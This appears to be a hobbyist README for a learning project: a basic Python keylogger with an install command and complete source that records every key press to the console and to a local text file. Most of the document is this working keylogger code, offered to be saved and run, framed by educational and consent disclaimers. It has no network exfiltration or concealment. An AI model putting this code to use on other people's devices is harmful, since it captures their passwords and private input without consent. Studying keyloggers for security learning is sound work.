# Basic Python Keylogger

---

This is a simple keylogger created in Python using `pynput`. The project was built in Visual Studio Code as part of my learning journey into cybersecurity and ethical hacking. It is intended **purely for educational purposes** — please do not use this unethically or without consent.

---

## What is a Keylogger?

A keylogger is a tool that records every keystroke made on a keyboard. It is often used to monitor user input and store that input into a file. While it can be used maliciously, it is also useful for educational demonstrations, user testing, and parental controls (when legally and ethically applied).

---

## Installation

Make sure Python is installed, then install the required package using the command below:

```bash
python -m pip install pynput
```
Then save the following code as keylogger.py and run it:
```python
# Import the keyboard listener module from pynput
from pynput import keyboard

# Define the function to run when a key is pressed
def keyPressed(key):
    print(str(key))  # Print the pressed key to the console

    # Open or create a text file to store the logged keys
    with open("keyfile.txt", 'a') as logKey:
        try:
            # Try to write the character to the file
            char = key.char
            logKey.write(char)
        except:
            # If it’s a special key (e.g. Enter, Shift), it might not have a char attribute
            print("Error getting char")

# Only run this section if the script is executed directly (not imported)
if __name__ == "__main__": 
    # Create a listener that triggers keyPressed whenever a key is pressed
    listener = keyboard.Listener(on_press=keyPressed)
    
    # Start the listener in the background
    listener.start()
    
    # Keep the program running with user input to prevent it from closing
    input()
```
# Disclaimer
This project is for educational purposes only. Using keyloggers without explicit permission is illegal and unethical. Always ensure you have proper consent before running this or similar software on any device.




